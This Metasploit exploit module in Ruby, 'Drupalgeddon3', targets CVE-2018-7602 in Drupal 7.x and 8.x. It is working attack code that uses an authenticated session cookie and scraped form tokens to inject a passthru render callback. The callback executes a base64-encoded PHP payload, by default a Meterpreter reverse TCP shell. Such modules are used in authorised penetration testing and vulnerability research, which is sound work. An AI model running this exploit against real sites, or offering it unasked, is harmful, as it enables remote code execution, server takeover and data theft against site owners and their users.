##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpClient

    def initialize(info={})
      super(update_info(info,
        'Name'           => 'Drupalgeddon3',
        'Description'    => %q{
          CVE-2018-7602 / SA-CORE-2018-004
          A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x.
          This potentially allows attackers to exploit multiple attack vectors on a Drupal site
          Which could result in the site being compromised.
          This vulnerability is related to Drupal core - Highly critical - Remote Code Execution

          The module can load msf PHP arch payloads, using the php/base64 encoder.

          The resulting RCE on Drupal looks like this: php -r 'eval(base64_decode(#{PAYLOAD}));'
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'SixP4ck3r',   # Research and port to MSF
            'Blaklis'      # Initial PoC
          ],
        'References'     =>
          [
            ['SA-CORE', '2018-004'],
            ['CVE', '2018-7602'],
          ],
        'DefaultOptions'  =>
        {
          'encoder' => 'php/base64',
          'payload' => 'php/meterpreter/reverse_tcp',
        },
        'Privileged'     => false,
        'Platform'       => ['php'],
        'Arch'           => [ARCH_PHP],
        'Targets'        =>
          [
            ['User register form with exec', {}],
          ],
        'DisclosureDate' => 'Apr 29 2018',
        'DefaultTarget'  => 0
      ))

      register_options(
        [
          OptString.new('TARGETURI', [ true, "The target URI of the Drupal installation", '/']),
          OptString.new('DRUPAL_NODE', [ true, "Exist Node Number (Page, Article, Forum topic, or a Post)", '1']),
          OptString.new('DRUPAL_SESSION', [ true, "Authenticated Cookie Session", '']),
        ])

      register_advanced_options(
        [

        ])
    end

    def uri_path
      normalize_uri(target_uri.path)
    end

    def start_exploit
      drupal_node = datastore['DRUPAL_NODE']
      res = send_request_cgi({
        'cookie' => datastore['DRUPAL_SESSION'],
        'method'   => 'GET',
        'uri'      => "#{uri_path}/node/#{drupal_node}/delete"
      })
      form_token = res.body.scan( /form_token" value="([^>]*)" \/>/).last.first
      print "[*] Token Form -> #{form_token}\n"
      r2 = send_request_cgi({
        'method'    => 'POST',
        'cookie' => datastore['DRUPAL_SESSION'],
        'uri'       => "#{uri_path}/?q=node/#{drupal_node}/delete&destination=node?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=php%20-r%20'#{payload.encoded}'",
        'vars_post' => {
        'form_id'   => 'node_delete_confirm',
        '_triggering_element_name' => 'form_id',
        'form_token'=> "#{form_token}"
        }
      })
      form_build_id = r2.body.scan( /form_build_id" value="([^>]*)" \/>/).last.first
      print "[*] Token Form_build_id -> #{form_build_id}\n"
      r3 = send_request_cgi({
        'method'    => 'POST',
        'cookie' => datastore['DRUPAL_SESSION'],
        'uri'       => "#{uri_path}/?q=file/ajax/actions/cancel/%23options/path/#{form_build_id}",
        'vars_post' => {
        'form_build_id'   => "#{form_build_id}"
        }
      })
    end

    def exploit
      case datastore['TARGET']
      when 0
        start_exploit
      else
        fail_with(Failure::BadConfig, "Your target is invalid.")
      end
    end
  end